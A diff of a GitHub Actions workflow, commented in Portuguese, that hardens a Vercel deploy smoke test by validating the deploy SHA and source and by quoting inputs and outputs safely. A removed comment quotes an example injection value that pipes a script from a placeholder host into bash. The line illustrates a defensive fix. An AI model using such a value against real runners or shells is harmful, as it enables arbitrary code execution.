@@ -1,11 +1,10 @@
-# Verifica o deploy real depois que a Vercel publica uma revisão.
-# Cobre a fronteira que os testes locais não enxergam: headers efetivamente servidos,
-# allowlist de arquivos e configuração do Supabase publicado. Previews ainda compartilham
-# o banco oficial enquanto o novo projeto de teste não for configurado.
+# O workflow_run carrega este YAML da main, inclusive quando o deploy veio de uma PR.
 name: Deploy smoke
 
 on:
-  deployment_status:
+  workflow_run:
+    workflows: [Deploy smoke event]
+    types: [completed]
   workflow_dispatch:
     inputs:
       url:
@@ -24,77 +23,79 @@ on:
 
 permissions:
   contents: read
+  deployments: read
 
 jobs:
   smoke:
     if: >-
-      github.event_name == 'workflow_dispatch' ||
-      (github.event.deployment_status.state == 'success' &&
-       (github.event.deployment_status.environment_url != '' ||
-        github.event.deployment_status.target_url != ''))
+      github.ref == 'refs/heads/main' &&
+      (github.event_name == 'workflow_dispatch' ||
+       (github.event.workflow_run.event == 'deployment_status' &&
+        github.event.workflow_run.actor.login == 'vercel[bot]' &&
+        github.event.workflow_run.conclusion == 'success'))
     runs-on: ubuntu-latest
     timeout-minutes: 5
-    env:
-      # Para previews com Deployment Protection, crie um Protection Bypass for Automation na
-      # Vercel e salve o MESMO valor como secret do repositório com este nome. Sem ele, o script
-      # falha com diagnóstico explícito em vez de testar por engano a tela de login da Vercel.
-      VERCEL_AUTOMATION_BYPASS_SECRET: ${{ secrets.VERCEL_AUTOMATION_BYPASS_SECRET }}
-      # O deployment_status entrega a URL POR-DEPLOY (divatdetro-<hash>-….vercel.app), que não
-      # está em HOSTS_PROD — e não deve estar: a allowlist existe justamente porque esses
-      # hostnames são gerados a cada deploy e não dá para enumerá-los. Verificar produção por ela
-      # fazia o gate exigir que a URL efêmera fosse produção, o oposto do isolamento que ele
-      # deveria provar — e era metade da razão de o smoke nunca ter passado. Produção é sempre
-      # verificada pelo alias estável. Este valor precisa continuar batendo com HOSTS_PROD no
-      # app.js; se divergir, o check_deploy.mjs reprova dizendo qual allowlist encontrou.
-      PRODUCTION_URL: https://divatdetro.vercel.app
-      DEPLOY_URL: >-
-        ${{ github.event_name == 'workflow_dispatch' &&
-            inputs.url ||
-            github.event.deployment_status.environment_url ||
-            github.event.deployment_status.target_url }}
-      DEPLOY_ENVIRONMENT: >-
-        ${{ github.event_name == 'workflow_dispatch' &&
-            inputs.environment ||
-            github.event.deployment.environment ||
-            'auto' }}
+    environment:
+      name: deploy-smoke
+      deployment: false
     steps:
       - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
         with:
+          ref: main
           persist-credentials: false
       - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
         with:
-          node-version: '20'
-      - name: Resolve a URL a verificar
+          node-version: '22'
+      - name: Resolver URL e ambiente a verificar
         id: alvo
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          DEPLOY_SHA: ${{ github.event.workflow_run.head_sha }}
+          INPUT_URL: ${{ inputs.url }}
+          INPUT_ENVIRONMENT: ${{ inputs.environment }}
+          PRODUCTION_URL: https://divatdetro.vercel.app
         shell: bash
         run: |
-          url="$DEPLOY_URL"
-          # Num despacho manual a URL foi escolhida a dedo — respeitá-la como veio. Só a URL
-          # vinda do deployment_status precisa ser trocada pelo alias canônico.
-          if [ "$GITHUB_EVENT_NAME" != 'workflow_dispatch' ]; then
-            case "$(echo "$DEPLOY_ENVIRONMENT" | tr '[:upper:]' '[:lower:]')" in
+          url="$INPUT_URL"
+          environment="$INPUT_ENVIRONMENT"
+          if [[ "$GITHUB_EVENT_NAME" == 'workflow_run' ]]; then
+            # O workflow anterior só sinaliza o evento. A URL vem da API do GitHub,
+            # em um status emitido pela Vercel para o SHA registrado no run.
+            [[ "$DEPLOY_SHA" =~ ^[0-9a-f]{40}$ ]]
+            deployments="$(gh api --method GET "repos/$REPO/deployments" -f sha="$DEPLOY_SHA" -F per_page=100)"
+            ids="$(jq -r '.[] | select(.creator.login == "vercel[bot]") | .id' <<< "$deployments")"
+            while IFS= read -r id; do
+              [[ -n "$id" ]] || continue
+              statuses="$(gh api "repos/$REPO/deployments/$id/statuses")"
+              status="$(jq -c '
+                first(.[] | select(.creator.login == "vercel[bot]" and .state == "success")
+                  | .url = ([.environment_url, .target_url] | map(select(. != null and . != "")) | first)
+                  | select((.url // "") | test("^https://divatdetro(-[a-z0-9-]+-lucas-molinari-s-projects)?[.]vercel[.]app/?$")))
+                // empty
+              ' <<< "$statuses")"
+              [[ -n "$status" ]] || continue
+              url="$(jq -r '.url' <<< "$status")"
+              environment="$(jq -r '.environment // "auto"' <<< "$status")"
+              break
+            done <<< "$ids"
+            if [[ -z "$url" ]]; then
+              echo "Nenhum deploy bem-sucedido da Vercel para o DIVAT nesse SHA." >&2
+              exit 1
+            fi
+            case "${environment,,}" in
               *prod*) url="$PRODUCTION_URL" ;;
             esac
           fi
-          echo "Verificando: $url"
-          # Delimitador heredoc em vez de `echo "url=$url"`: $url carrega, sem sanitização, o
-          # `inputs.url` livre do workflow_dispatch — uma quebra de linha ali injetaria uma
-          # chave extra no $GITHUB_OUTPUT (o mesmo arquivo de comandos do runner). Sem
-          # consumidor hoje, mas fica fechado por hábito, não pelo caso de uso atual.
+
+          delimiter="EOF_$(openssl rand -hex 12)"
           {
-            echo "url<<__DEPLOY_URL_EOF__"
-            echo "$url"
-            echo "__DEPLOY_URL_EOF__"
+            printf 'url<<%s\n%s\n%s\n' "$delimiter" "$url" "$delimiter"
+            printf 'environment<<%s\n%s\n%s\n' "$delimiter" "$environment" "$delimiter"
           } >> "$GITHUB_OUTPUT"
-      # TODA entrada passa por `env:` e é lida como "$VAR" no shell — nunca `${{ }}` dentro do
-      # `run:` (mesma regra do atualizar-baseline.yml). A interpolação acontece ANTES do shell
-      # existir: o valor vira texto no meio do script, e `steps.alvo.outputs.url` carrega, sem
-      # sanitização, o `inputs.url` do workflow_dispatch — um `string` livre. Um valor como
-      # `https://x"; curl evil.sh|bash #` quebraria as aspas e executaria comando arbitrário no
-      # runner (CWE-78 / yaml.github-actions.security.run-shell-injection). O Semgrep vendorizado
-      # não pega este caso porque o padrão da regra cobre `github.*`/`inputs.*` diretos, não
-      # `steps.*.outputs.*` — daí não ter aparecido no `./scripts/semgrep.sh`.
       - name: Headers, allowlist e configuração do Supabase
         env:
-          DEPLOY_URL_RESOLVIDA: ${{ steps.alvo.outputs.url }}
-        run: node scripts/check_deploy.mjs "$DEPLOY_URL_RESOLVIDA" "$DEPLOY_ENVIRONMENT"
+          DEPLOY_URL: ${{ steps.alvo.outputs.url }}
+          DEPLOY_ENVIRONMENT: ${{ steps.alvo.outputs.environment }}
+          VERCEL_AUTOMATION_BYPASS_SECRET: ${{ secrets.VERCEL_AUTOMATION_BYPASS_SECRET }}
+        run: node scripts/check_deploy.mjs "$DEPLOY_URL" "$DEPLOY_ENVIRONMENT"
